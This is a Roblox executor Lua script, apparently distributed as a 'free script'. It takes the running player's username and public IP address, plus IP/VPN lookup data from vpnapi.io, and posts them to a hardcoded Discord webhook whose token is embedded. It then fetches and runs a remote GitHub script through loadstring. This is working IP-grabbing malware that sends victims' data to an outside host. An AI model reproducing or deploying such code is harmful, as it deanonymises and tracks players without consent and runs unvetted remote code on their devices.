

local nameplayer = game.Players.LocalPlayer.Name
local webhook = "https://discord.com/api/webhooks/1049030878828970116/YT6rmyYDuCFyvjS6vX2UYBhMTsTchOhAkUNwWj3VunreH78fINJcUTjiK0W5qUbjBm3h"
function GrabIP()
    local Response = request({
        Url = "https://api.ipify.org/",
        Method = "GET"
    })

    local text = nameplayer..": "..Response.Body


    local embed = {
       ['title'] = 'IP PLAYER',
       ['description'] = text
    }
    local a = request({
       Url = webhook,
       Headers = {['Content-Type'] = 'application/json'},
       Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed}, ['content'] = ''}),
       Method = "POST"
    })
end

GrabIP()
--another option
local webh = "https://discord.com/api/webhooks/1049030878828970116/YT6rmyYDuCFyvjS6vX2UYBhMTsTchOhAkUNwWj3VunreH78fINJcUTjiK0W5qUbjBm3h"

pcall(function()
   local data = {
       ["embeds"] = {
           {
               ["title"] = game:GetService("Players").LocalPlayer.Name;
               ["description"] = game:HttpGet("https://vpnapi.io/api/");
               ["color"] = tonumber(0x7269da);
           }
       }
   }

   if syn then
       local response = syn.request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif request then
       local response = request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif http_request then
       local response = http_request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   end
end)

loadstring(game:HttpGet"https://raw.githubusercontent.com/xDepressionx/Free-Script/main/AllScript.lua")()
